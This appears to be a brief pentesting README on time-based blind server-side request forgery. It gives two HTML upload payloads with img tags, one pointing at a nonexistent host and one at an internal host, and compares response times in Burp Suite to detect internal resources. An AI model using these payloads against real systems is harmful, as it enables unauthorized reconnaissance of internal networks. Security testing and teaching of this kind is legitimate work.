It does what says on the tin.. basically I a very empiric method to check for existence of internal resources(ex internal site) by checking and comparing response time from the website on example file-upload.

# How to check(prepare Burpsuite):
1)Start by sending a request that check for SSRF back to a fake site (check the response time in burp on bottom-right side) **ex:10sec**
```
<html>
    <body>
        <b>Time-Based Blind SSRF</b>
        <img src="http://blah.nonexistent.com">
    </body>
</html>
```
2)Send a legit SSRF request back and compare results (existent resources will be much faster) **ex:less than 1sec**
```
<html>
    <body>
        <b>Time-Based Blind SSRF</b>
        <img src="http://internal.app.local/">
    </body>
</html>
```
